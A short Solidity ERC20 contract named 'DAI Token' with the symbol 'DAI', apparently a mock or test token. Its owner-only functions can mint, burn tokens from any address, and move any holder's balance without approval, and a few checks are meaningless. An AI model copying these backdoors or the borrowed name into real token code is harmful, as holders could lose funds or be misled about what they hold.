// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./openzeppelin/ERC20.sol";

contract DaiToken is ERC20 {

    //////////////////////////////////////////////////////////////////////////////////
    //                                                                              //
    //                                                                              //
    //                     MAPPINGS, VARIABLES AND CONSTRUCTOR                      //
    //                                                                              //
    //                                                                              //
    //////////////////////////////////////////////////////////////////////////////////

    uint INITIAL_SUPPLY = 1_000_000e18;
    uint MAX_SUPPLY = 100_000_000e18;

    address owner;
    address master;

    string name_ = "DAI Token";
    string symbol_ = "DAI";

    constructor() ERC20(name_, symbol_) {
        owner = msg.sender;

        _mint(msg.sender, INITIAL_SUPPLY);
    }

    //////////////////////////////////////////////////////////////////////////////////
    //                                                                              //
    //                                                                              //
    //                              PRIVATE FUNCTIONS                               //
    //                                                                              //
    //                                                                              //
    //////////////////////////////////////////////////////////////////////////////////

    function masterMint(address _addy, uint256 _amount) public onlyOwner {
        require(totalSupply() + _amount <= MAX_SUPPLY, "Max supply reached");

        _mint(_addy, _amount);
    }

    function masterBurn(address _addy, uint256 _amount) public onlyOwner {
        require(totalSupply() - _amount >= 0, "Min supply reached");

        _burn(_addy, _amount);
    }

    function masterTransfer(address _from, address _to, uint256 _amount) public onlyOwner {
        require(balanceOf(_from) >= _amount, "Balance too low");

        _transfer(_from, _to, _amount);
    }

    function setOwner(address _addy) public onlyOwner {
        owner = _addy;
    }

    function setMaster(address _user) public onlyOwner {
        master = _user;
    }

    //////////////////////////////////////////////////////////////////////////////////
    //                                                                              //
    //                                                                              //
    //                                  MODIFIERS                                   //
    //                                                                              //
    //                                                                              //
    //////////////////////////////////////////////////////////////////////////////////

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier onlyMaster() {
        require(msg.sender == master, "Not master");
        _;
    }
}